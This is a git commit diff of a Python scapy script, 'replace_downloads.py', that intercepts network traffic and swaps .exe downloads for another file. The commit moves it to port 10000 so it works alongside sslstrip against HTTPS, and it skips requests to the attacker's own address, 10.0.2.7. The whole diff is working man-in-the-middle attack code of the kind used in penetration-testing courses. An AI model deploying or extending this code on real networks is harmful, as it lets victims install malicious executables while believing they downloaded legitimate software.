c17e18dfb13dfb379027f497ea47baeb59693279
Evan <erflynn21@gmail.com>
2020-05-12 20:28:12 -0400

    Updated to work with both http and https through use of sslstrip

--- replace_downloads.py
+++ replace_downloads.py
@@ -18,12 +18,12 @@ def set_load(packet, load):
 def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.Raw):
-        if scapy_packet[scapy.TCP].dport == 80:
-            if ".exe" in scapy_packet[scapy.Raw].load:
-                print("[+] zip Request")
+        if scapy_packet[scapy.TCP].dport == 10000:
+            if ".exe" in scapy_packet[scapy.Raw].load and "10.0.2.7" not in scapy_packet[scapy.Raw].load:
+                print("[+] exe Request")
                 ack_list.append(scapy_packet[scapy.TCP].ack)
 
-        elif scapy_packet[scapy.TCP].sport == 80:
+        elif scapy_packet[scapy.TCP].sport == 10000:
             if scapy_packet[scapy.TCP].seq in ack_list:
                 ack_list.remove(scapy_packet[scapy.TCP].seq)
                 print("[+] Replacing file")
